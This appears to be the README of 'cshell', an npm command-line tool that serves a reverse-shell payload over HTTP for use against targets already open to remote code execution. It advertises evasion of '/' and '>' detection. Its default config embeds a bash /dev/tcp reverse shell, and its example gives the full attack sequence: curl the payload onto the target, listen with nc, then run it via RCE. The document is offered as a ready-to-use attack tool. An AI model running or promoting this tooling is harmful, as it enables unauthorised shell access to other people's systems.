# CShell

This program could attach the file to the root path of the HTTP server.

## Superiority

- Bypass `/` and `>` detection and bounce the shell
- Use-friendly and highly customized cli tool

## Usage

### Quick Start

Run

```bash
npm i -g cshell
```

Use

```bash
cshell
```

For more help, please try `cshell --help`.

### From Source Code

Enter the source code directory. Install the dependencies.

```bash
npm ci
```

Install the cli tool globally.

```bash
npm link
```

Then you can directly use it on console every where. Try:

```bash
cshell
```

For more help, please try `cshell --help`.

### Configuration

It is recommended to initialize the config by running following command.

```bash
cshell-conf <path>
```

`<path>` refers to the config. Each KV is optional, and it will fallback to the default value.

Default config file is as followings.

```js
{
    // http server to visit
    "server-host": "127.0.0.1",
    "server-port": 54180,
    // master controller
    "shell-host": "127.0.0.1",
    "shell-port": 54188,
    // static directory
    "static": "",
    // file path whose content is attached
    "file": "",
    // content type of the file
    "content-type": "text/plain",
    // which content if file is not specified
    "default-file-content": "bash -i &> /dev/tcp/${{ env.shell_host }}/${{ env.shell_port }} 0>&1"
}
```

Note that `${{ something }}` in the file content will be replaced to corresponding values. Specially, `env` has following sub-values:

- `server_host`
- `server_port`
- `shell_port`
- `shell_port`

## Example

Run

```bash
cshell --host 12.34.56.78 --port 2020
```

Show

```plain
Server is running at port 2020...

- Try curl -o shell.sh 12.34.56.78:2020 on the target machine.
- Try nc -lvp 2020 on the master controller (12.34.56.78).

DO NOT forget to quit this process!!!
```

On the target machine to attack, run `curl -o shell.sh 12.34.56.78:2020` via RCE. On console displays `GET / FROM xx.xx.xx.xx`.

Then we press `Ctrl`+`C` to quit the program and run `nc -lvp 2020` on the master controller.

Attack the target machine by running `bash shell.sh` via RCE and we get the shell on the master controller.

## License

[MIT](https://mit-license.org)
